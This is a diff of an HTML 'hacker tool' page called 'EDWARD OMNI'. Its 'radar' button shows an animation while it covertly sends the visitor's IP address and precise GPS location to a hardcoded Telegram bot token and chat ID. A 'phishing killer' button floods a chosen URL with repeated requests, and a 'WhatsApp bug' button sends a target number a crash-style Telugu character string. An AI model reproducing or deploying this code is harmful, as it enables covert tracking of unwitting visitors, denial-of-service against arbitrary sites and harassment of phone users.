@@ -3,109 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI - LEGACY ]</title>
+    <title>EDWARD OMNI</title>
     <style>
-        :root { --neon: #0f0; --danger: #f00; --bg: #000; }
-        /* Hide GitHub Header */
-        header, .Header, .gh-header { display: none !important; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; margin:0; padding: 15px; }
-        h2 { text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); margin: 5px 0 15px 0; font-size: 16px; }
-        .panel { border: 1px solid var(--neon); border-radius: 4px; padding: 12px; margin-bottom: 12px; text-align: left; background: #050505; }
-        h3 { margin: 0 0 10px 0; font-size: 12px; text-transform: uppercase; color: #fff; }
-        input { background: #000; border: 1px solid #333; color: #fff; padding: 10px; width: 88%; border-radius: 4px; margin-bottom: 8px; font-size: 11px; outline: none; font-family: 'Courier New', monospace; }
-        button { width: 100%; padding: 12px; font-weight: bold; border-radius: 4px; border: none; cursor: pointer; text-transform: uppercase; font-size: 11px; font-family: 'Courier New', monospace; }
-        .wa-btn { background: #25D366; color: #000; }
-        .phish-btn { background: #bc13fe; color: #fff; }
-        .radar-btn { background: var(--bg); color: var(--neon); border: 1px solid var(--neon); }
-        /* LOG SERANGAN */
-        .log-container { background: #000; border: 1px solid #222; border-radius: 4px; height: 80px; overflow-y: auto; padding: 8px; text-align: left; font-size: 10px; color: #555; margin-top: 5px; }
-        .log-success { color: var(--neon); }
+        :root { --neon: #0f0; --bg: #000; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 20px; }
+        .header-title { font-size: 18px; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); margin: 20px 0; font-weight: bold; text-align: center; }
+        .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; background: rgba(10, 10, 10, 0.8); box-shadow: 0 0 15px rgba(0, 255, 0, 0.1); }
+        h3 { margin: 0 0 15px 0; font-size: 13px; color: #fff; letter-spacing: 2px; }
+        input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 10px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 12px; }
+        .btn-wa { background: #25D366; color: #000; }
+        .btn-phish { background: #bc13fe; color: #fff; }
+        .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
+        #statusAttack { font-size: 10px; color: #ff0000; margin-top: 10px; display: none; text-align: center; }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-circle { width: 180px; height: 180px; border: 2px solid var(--neon); border-radius: 50%; position: relative; }
-        .radar-sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.5), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-right: 2px solid var(--neon); }
+        .radar-ring { width: 220px; height: 220px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
+        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; border-right: 1px solid var(--neon); }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        canvas, video { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>EDWARD OMNI V.40.0</h2>
+    <div class="header-title">EDWARD OMNI</div>
 
-    <div class="panel">
-        <h3>[ 01 ] WHATSAPP BUG</h3>
-        <input type="number" id="noWA" placeholder="628xxxxxxx">
-        <button class="wa-btn" onclick="startCrashWA()">SEND GHOST PAYLOAD ☠️</button>
+    <div class="card">
+        <h3>WHATSAPP BUG</h3>
+        <input type="number" id="noWA" placeholder="Target (628...)">
+        <button class="btn btn-wa" onclick="startWA()">EXECUTE ☠️</button>
     </div>
 
-    <div class="panel">
-        <h3>[ 02 ] PHISHING KILLER</h3>
-        <input type="text" id="targetUrl" placeholder="Link Web Penipu">
-        <button class="phish-btn" onclick="brutalAttack()">LAUNCH BRUTAL ATTACK 🔥</button>
-        <div class="log-container" id="attackLog">
-            > STANDBY... WAITING FOR COMMAND
-        </div>
+    <div class="card">
+        <h3>PHISHING KILLER</h3>
+        <input type="text" id="targetUrl" placeholder="URL Target Penipu">
+        <button class="btn btn-phish" id="atkBtn" onclick="toggleAttack()">LAUNCH SILENT ATTACK 🔥</button>
+        <div id="statusAttack">ATTACKING SERVER: [ SENDING PACKETS... ]</div>
     </div>
 
-    <div class="panel">
-        <h3>[ 03 ] RADAR PRECISION</h3>
-        <button class="radar-btn" onclick="startRadar()">AKTIFKAN RADAR 📡</button>
+    <div class="card">
+        <h3>SATELLITE RADAR</h3>
+        <button class="btn btn-radar" onclick="startRadar()">ACTIVATE RADAR 📡</button>
     </div>
 
     <div id="radarOverlay">
-        <div class="radar-circle"><div class="radar-sweep"></div></div>
-        <p id="statusTxt" style="color:var(--neon); margin-top:20px; font-size:12px;">CALIBRATING GPS PRECISION...</p>
-        <button onclick="location.reload()" style="background:transparent; color:#333; border:none; margin-top:15px; font-size:10px;">[ EXIT ]</button>
+        <div class="radar-ring"><div class="sweep"></div></div>
+        <p id="st" style="margin-top:30px; font-size:10px; letter-spacing:2px;">SCANNING...</p>
+        <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:20px;">[ CLOSE ]</button>
     </div>
 
-    <canvas id="canvas"></canvas>
-    <video id="v" autoplay playsinline></video>
-
     <script>
-        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
-        const ID = '7898572558';
+        let isAttacking = false;
+        let attackInterval;
 
-        function addLog(msg, success = false) {
-            const log = document.getElementById('attackLog');
-            const span = document.createElement('div');
-            span.className = success ? 'log-success' : '';
-            span.innerText = "> " + msg;
-            log.appendChild(span);
-            log.scrollTop = log.scrollHeight;
+        function toggleAttack() {
+            let u = document.getElementById('targetUrl').value;
+            if(!u) return alert("Masukkan URL!");
+            
+            const btn = document.getElementById('atkBtn');
+            const status = document.getElementById('statusAttack');
+
+            if(!isAttacking) {
+                isAttacking = true;
+                btn.innerText = "STOP ATTACK 🛑";
+                status.style.display = "block";
+                
+                // Serangan Latar Belakang (Silent Flood)
+                attackInterval = setInterval(() => {
+                    for(let i=0; i<50; i++) {
+                        fetch(u, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
+                    }
+                }, 100);
+            } else {
+                isAttacking = false;
+                btn.innerText = "LAUNCH SILENT ATTACK 🔥";
+                status.style.display = "none";
+                clearInterval(attackInterval);
+            }
         }
 
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    let msg = "🔱 [ LOCKED ] 🔱\nIP: "+ipData.ip+"\nACC: "+p.coords.accuracy.toFixed(1)+"m\nLOC: https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
-                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent(msg));
-                    document.getElementById('statusTxt').innerText = "COORDINATES SECURED.";
-                }, null, { enableHighAccuracy: true });
-            } catch (e) {}
+                const ipR = await fetch('https://api.ipify.org?format=json');
+                const ipD = await ipR.json();
+                navigator.geolocation.getCurrentPosition((p) => {
+                    let m = "🔱 [ LOCKED ] 🔱\nIP: "+ipD.ip+"\nLOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
+                    fetch("https://api.telegram.org/bot8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g/sendMessage?chat_id=7898572558&text="+encodeURIComponent(m));
+                    document.getElementById('st').innerText = "SUCCESS: DATA SENT";
+                }, null, {enableHighAccuracy:true});
+            } catch(e){}
         }
 
-        function brutalAttack() {
-            let url = document.getElementById('targetUrl').value;
-            if(!url) return;
-            addLog("INITIALIZING FLOOD ATTACK...", true);
-            let count = 0;
-            let interval = setInterval(() => {
-                window.open(url, '_blank', 'width=10,height=10');
-                count++;
-                addLog("PACKET SENT TO " + url.substring(0,20) + "... [" + count + "]", true);
-                if(count >= 20) {
-                    clearInterval(interval);
-                    addLog("ATTACK CYCLE COMPLETE.");
-                }
-            }, 300);
-        }
-
-        function startCrashWA() {
+        function startWA() {
             let n = document.getElementById('noWA').value;
-            let p = "జ్ఞਾ".repeat(300);
-            navigator.clipboard.writeText(p).then(() => { window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=RADAR_BOOT_v40"; });
+            window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=జ్ఞా".repeat(200);
         }
     </script>
 </body>
